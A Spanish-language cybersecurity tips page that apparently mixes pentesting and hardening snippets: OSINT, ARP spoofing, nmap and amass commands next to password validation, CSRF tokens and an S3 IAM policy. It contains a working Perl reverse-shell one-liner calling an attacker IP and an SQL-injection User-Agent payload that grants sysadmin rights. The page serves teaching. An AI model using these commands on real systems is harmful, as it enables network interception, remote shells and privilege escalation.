[ OSINT ] Detección de Tecnologías con Wappalyzer

La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.


# Comando CLI de Wappalyzer (requiere instalación)
wappalyzer https://target.com

[ MAN IN THE MIDDLE ] Configuración de ARP Spoofing (Ejemplo)

El ataque de ARP Spoofing (`ARP Cache Poisoning`) es la base para muchos ataques 'Man in the Middle' dentro de una red local. El objetivo es engañar al router y al objetivo para que envíen todo el tráfico a la máquina del atacante.


# En Kali Linux, usando ettercap (GUI o CLI) o arpspoof.

# Habilitar el reenvío de IP para que la red siga funcionando
echo 1 > /proc/sys/net/ipv4/ip_forward

# Comando arpspoof: engaña al target para que piense que el router es el atacante
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

[ CÓDIGO ] Script para validar contraseñas seguras (Python)

Función educativa para validar la complejidad de una contraseña, exigiendo mayúsculas, minúsculas, números y símbolos, y una longitud mínima.


import re

def is_strong(password):
    if len(password) < 12:
        return False
    if not re.search(r"[a-z]", password):
        return False
    if not re.search(r"[A-Z]", password):
        return False
    if not re.search(r"\d", password):
        return False
    if not re.search(r"[$@#%&]", password): # Caracteres especiales
        return False
    return True

print(is_strong("SecurePass123#")) # True
print(is_strong("weak")) # False

// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //

[ HARDENING ] Deshabilitar servicios innecesarios en Linux

La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl`:


# Ver todos los servicios activos
systemctl list-units --type=service --state=running

# Deshabilitar un servicio (ej. Apache si no se usa)
sudo systemctl stop apache2
sudo systemctl disable apache2

# Si el servicio es realmente innecesario, también se puede enmascarar
sudo systemctl mask apache2

[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)

Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.


// Ejemplo conceptual en PHP (parte del formulario)
<?php
    session_start();
    $token = bin2hex(random_bytes(32));
    $_SESSION['csrf_token'] = $token;
?>

<form method="POST" action="/cambiar-pass">
    <input type="hidden" name="csrf_token" value="<?= $token ?>">
    <!-- Campos del formulario -->
</form>

[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)

En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.


{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject"
            ],
            "Resource": [
                "arn:aws:s3:::mi-bucket-seguro/public/*"
            ]
        }
    ]
}

// 0x03 ARCHIVO HISTÓRICO: Explotación y Conceptos Base //

[ TÉCNICA ] Enumeración de Subdominios (OSINT)

La recolección de información pasiva es el primer paso en un pentesting. Usar herramientas como `sublist3r` o métodos de certificados SSL son cruciales. Este es un ejemplo de un comando `amass` básico.


amass enum -d dominioobjetivo.com -o /tmp/subdomains.txt

[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)

Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix.


perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'

[ REDES ] Escaneo de Versiones de Servicio con Nmap

Además de escanear puertos, Nmap puede intentar determinar la versión del software que se ejecuta en ese puerto, lo cual es vital para buscar exploits específicos. El parámetro `-sV` es para "version scan".


nmap -sV -p 21,22,80,443 192.168.1.100

[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP

No todas las vulnerabilidades están en los parámetros GET/POST. A menudo, las aplicaciones procesan los Headers HTTP (User-Agent, Referer, X-Forwarded-For) sin sanitizar, lo que puede llevar a inyecciones.


# Ejemplo de payload en el Header User-Agent
User-Agent: '; EXEC sp_addsrvrolemember 'usuario', 'sysadmin' --

Esto busca una inyección SQL ciega en el backend que procese el User-Agent.
